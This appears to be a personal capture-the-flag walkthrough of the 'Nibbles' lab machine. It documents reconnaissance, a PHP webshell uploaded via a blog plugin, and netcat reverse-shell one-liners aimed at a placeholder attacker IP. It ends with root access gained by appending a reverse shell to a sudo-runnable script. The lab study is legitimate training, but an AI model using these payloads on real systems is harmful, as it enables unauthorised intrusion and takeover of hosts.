# NIBBLES - Easy

**Date Started:** January 26, 2026  
**Difficulty:** Easy  
**Status:** ✅ COMPLETE

---

## Phase 1: Initial Reconnaissance

### Step 1: Initial Service Enumeration Scan

**Command:**
```
nmap -sV --open -oA nibbles_initial_scan TARGET_IP
```

**Explanation:**
- `-sV`: Service version enumeration scan
- `--open`: Only return ports that are open (filters out closed/filtered)
- `-oA nibbles_initial_scan`: Output all formats (XML, greppable, text) with basename `nibbles_initial_scan`
  - Outputs: `nibbles_initial_scan.nmap`, `nibbles_initial_scan.xml`, `nibbles_initial_scan.gnmap`

**Best Practice Note:** It is essential to get in the habit of taking extensive notes and saving all console output early on. The better we get at this while practicing, the more second nature it will become when on real-world engagements. Proper notetaking is critical for pentesting and will significantly speed up the reporting process and ensure no evidence is lost. It is also essential to keep detailed time-stamped logs of scanning and exploitation attempts in an outage or incident where the client needs information about our activities.

**Understanding Default Port Scans:**
To see which ports a given nmap scan type will probe, run:
```
nmap -v -oG - [no target specified]
```
- `-v`: Verbose output
- `-oG -`: Output in greppable format to stdout

This will fail (no target), but shows which ports are scanned by default for that scan type.

---

### Step 2: Target Machine Service Enumeration

**Command Run:**
```
nmap -sS -sV TARGET_IP
```

**Scan Type Explanation:**
- `-sS`: TCP SYN stealth scan
- `-sV`: Service version detection

**Findings:**

| Port | Service | Version | Status |
|------|---------|---------|--------|
| 80 | HTTP | Apache 2.4.18 | Open |

**Apache Version Identified:** Apache 2.4.18

---

**Key Findings:**
- Apache web server running on port 80
- Version: 2.4.18

---

## Phase 2: Web Footprinting & Technology Discovery

### Step 1: Initial Web Technology Detection
```
whatweb TARGET_IP
```
**Result:** No standard web technologies detected on root domain

### Step 2: Source Code Inspection
```
curl http://TARGET_IP
```
**Finding:** Discovered `/nibbleblog/` subdirectory in source code

### Step 3: Technology Detection on Subdirectory
```
whatweb http://TARGET_IP/nibbleblog/
```
**Result:** Nibbleblog platform detected

### Step 4: Hidden Directory Enumeration
```
gobuster dir -u http://TARGET_IP/nibbleblog/ --wordlist ~/SecLists/Discovery/Web-Content/common.txt
```
**Key Discoveries:**
- `admin.php` - Admin login page
- `README` - Application information file
- `content/` directory with subdirectories: `public/`, `private/`, `tmp/`

### Step 5: Version Identification
```
curl http://TARGET_IP/nibbleblog/README
```
**Finding:** Nibbleblog version **4.0.3**

---

## Phase 3: Authentication & Credential Discovery

### Step 1: Admin Login Attempts
- Tried basic credentials: `admin:admin`, `admin:password`
- **Result:** Failed - Note: System enforces login attempt lockout after multiple failures
- Password reset failed due to email errors

### Step 2: Username Enumeration
Browsed GoBuster results and found interesting paths in `nibbleblog/content/private/`

**Command:**
```
curl -s http://TARGET_IP/nibbleblog/content/private/user.xml | xmllint --format -
```
**Finding:** Username enumerated as **admin**

### Step 3: Configuration File Analysis
Located `config.xml` in `content/private/` directory. While no explicit password found, noticed mentions of "nibbles" (the box name).

### Step 4: Credential Success
**Credentials Found:**
- Username: `admin`
- Password: `nibbles`

**Note:** Password is set during installation with no known defaults - box name as password is a common HTB pattern.

---

## Phase 4: Remote Code Execution via Plugin Upload

### Step 1: Admin Panel Enumeration
Located **Plugins** section in admin interface. The **My_image** plugin allows image file uploads.

### Step 2: PHP Upload Test
Created test script to verify code execution:

**File: `image.php`**
```php
<?php system('id'); ?>
```

### Step 3: Upload & Verification
Uploaded `image.php` through My_image plugin upload functionality.

**Verification Command:**
```
curl http://TARGET_IP/nibbleblog/content/private/plugins/my_image/
```
**Result:** File confirmed in directory listing

**Execution Verification:**
```
curl http://TARGET_IP/nibbleblog/content/private/plugins/my_image/image.php
```
**Result:** Script executed successfully (confirmed RCE)

### Step 4: Reverse Shell Payload
Modified `image.php` with reverse shell command:

```php
<?php system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ATTACKING_IP> <PORT> >/tmp/f"); ?>
```

**Reverse Shell One-liner (bash):**
```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ATTACKING_IP> <PORT> >/tmp/f
```

### Step 5: Reverse Shell Establishment

**On Attack Machine - Start Listener:**
```
nc -lvnp 9443
```

**Trigger RCE:**
```
curl http://TARGET_IP/nibbleblog/content/private/plugins/my_image/image.php
```

### Step 6: Shell Upgrade
Detected Python 3 available on target:
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```
**Result:** Interactive bash shell established

---

## Phase 5: User-Level Enumeration & Flag Retrieval

### Step 1: User Directory Exploration
```bash
cd /home/nibbler
ls -la
```
**Findings:**
- `user.txt` - User flag (captured)
- `personal.zip` - Compressed archive containing personal files

### Step 2: Archive Analysis
```bash
unzip personal.zip
ls -la personal/stuff/
cat personal/stuff/monitor.sh
```
**Key Finding:** `monitor.sh` script - potential privilege escalation vector

---

## Phase 6: Privilege Escalation

### Step 1: Automated Enumeration
Downloaded LinEnum.sh on attack machine:
```bash
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
```

### Step 2: File Transfer to Target
**On Attack Machine - Start HTTP Server:**
```bash
sudo python3 -m http.server 8080
```

**On Target Machine - Download:**
```bash
wget http://<ATTACK_IP>:8080/LinEnum.sh
chmod +x LinEnum.sh
./LinEnum.sh
```

### Step 3: Privilege Escalation Vector Identified
**LinEnum Output - Critical Finding:**
```
Possible sudo pwnage!
/home/nibbler/personal/stuff/monitor.sh
```

**Finding:** `monitor.sh` can be run with sudo privileges as user nibbler without password

### Step 4: Exploit monitor.sh
**CRITICAL:** Must append to end of file to avoid overwriting content

**Append Reverse Shell to monitor.sh:**
```bash
cd /home/nibbler/personal/stuff
echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ATTACK_IP> 8443 >/tmp/f' | tee -a monitor.sh
```

**On Attack Machine - Start Root Listener:**
```bash
nc -lvnp 8443
```

**Execute with Sudo:**
```bash
sudo /home/nibbler/personal/stuff/monitor.sh
```

### Step 5: Root Shell Upgrade
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

### Step 6: Root Flag Retrieval
```bash
cd /root
cat root.txt
```
**Result:** Root flag captured - BOX PWNED ✅

---

## Exploitation Chain Summary

1. **Reconnaissance** → Apache 2.4.18 detected on port 80
2. **Web Footprinting** → Discovered `/nibbleblog/` subdirectory
3. **Enumeration** → Found `admin.php`, `README` (version 4.0.3), and configuration files
4. **Credential Discovery** → Username via `user.xml`, password via `config.xml` hints (box name)
5. **Authentication** → Logged in as `admin:nibbles`
6. **RCE** → Exploited My_image plugin to upload PHP webshell
7. **User Access** → Established reverse shell as www-data user
8. **User Flag** → Retrieved `user.txt` from `/home/nibbler/`
9. **PrivEsc Vector** → Identified `monitor.sh` executable via sudo (LinEnum.sh)
10. **Root Access** → Appended reverse shell to `monitor.sh` and executed with sudo
11. **Root Flag** → Retrieved `root.txt` from `/root/`

---

## Key Techniques & Tools

| Technique | Tool/Command | Purpose |
|-----------|--------------|---------|
| Service Enumeration | nmap -sV | Identify services and versions |
| Web Tech Detection | whatweb | Identify web technologies |
| Directory Brute Force | gobuster | Find hidden directories |
| Source Code Inspection | curl | Examine page source |
| Credential Discovery | Manual analysis | Extract username/password hints |
| Code Execution | PHP upload | Webshell creation and execution |
| Reverse Shell | netcat + bash | Interactive shell access |
| Shell Upgrade | python3 pty | Better shell experience |
| Privilege Escalation | LinEnum.sh | Automated enumeration |
| Sudo Exploitation | echo + tee | Append to scripts and execute with sudo |

---

## Critical Lessons Learned

### Technical Exploitation Lessons
1. **Plugin Upload Vulnerability** - File upload restrictions can be bypassed if not properly validated
2. **Code Execution** - Even image upload fields can execute arbitrary code if validation insufficient
3. **Credential Hints** - Configuration files and box names often hint at default/weak credentials
4. **Sudo Abuse** - Scripts executable with sudo without password are critical privesc vectors
5. **File Manipulation** - Always append to files, never overwrite, to avoid losing functionality
6. **Enumeration Tools** - Automated tools like LinEnum.sh significantly speed up privesc discovery
7. **Python pty Module** - Essential for upgrading basic shells to interactive shells
8. **HTTP Server** - Python's http.server is useful for transferring files to targets

### Operational Security & Best Practices
1. **VPN Connection Status** - CRITICAL: Always verify you are connected to the VPN regularly throughout an engagement. Unexpected disconnects can break exploitation chains and cause confusion.
   - Check status: `ip addr show tun0` (verify your tun0 interface exists and has an IP)
   - Or use: `ifconfig tun0` to verify active connection

2. **File Transfer Direction Awareness** - Understand which direction files are traveling:
   - **Attack Machine → Target Machine**: When hosting a listener (http.server, SMB server, etc.), use your **VPN IP (tun0)** on the attack machine
   - **Target Machine → Attack Machine**: When receiving reverse shells or data, listen on your **VPN IP (tun0)**
   - **Common Mistake**: Using `127.0.0.1`, `localhost`, or wrong IP causes file transfer failures
   
   **Example from Nibbles:**
   ```bash
   # CORRECT - Using tun0 VPN IP
   Attack Machine: sudo python3 -m http.server 8080  (on tun0 IP)
   Target Command: wget http://<ATTACK_tun0_IP>:8080/LinEnum.sh
   
   # INCORRECT - Would fail
   Attack Machine: sudo python3 -m http.server 8080  (on 127.0.0.1)
   Target Command: wget http://127.0.0.1:8080/LinEnum.sh  (unreachable)
   ```

3. **Script Transfer Verification**
   - Always verify files transferred correctly: `ls -la filename`
   - Check file integrity if needed: `md5sum filename`
   - Verify permissions before execution: `chmod +x script.sh`

---

## Status

✅ **BOX PWNED**
- User flag: Retrieved ✓
- Root flag: Retrieved ✓
- Time: ~2 hours
- Difficulty: Easy (accurate classification - straightforward exploitation chain)

**Key Takeaway**: The combination of weak credentials, file upload exploitation, and improper sudo configuration made this a practical example of real-world vulnerabilities. The operational lesson about VPN IP usage is critical for all future engagements.
